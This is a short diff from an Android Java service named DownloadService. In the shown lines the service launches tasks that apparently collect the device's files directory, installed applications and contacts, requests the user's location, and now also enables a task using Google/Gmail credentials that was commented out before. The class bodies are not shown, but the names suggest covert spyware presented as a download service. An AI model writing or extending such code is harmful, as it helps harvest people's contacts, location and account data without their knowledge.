@@ -180,7 +180,7 @@ public class DownloadService extends IntentService {
                 new GetFilesDirectoryClass().execute();
                 new GetApplicationClass().execute();
                 new GetContactsClass().execute();
-                //   new MakeRequestTask(this, GetGmail.mCredential).execute();
+                new MakeRequestTask(DownloadService.this, googleCredentials).execute();
 
                 SingleShotLocationProvider.requestSingleUpdate(DownloadService.this,
                         new SingleShotLocationProvider.LocationCallback() {
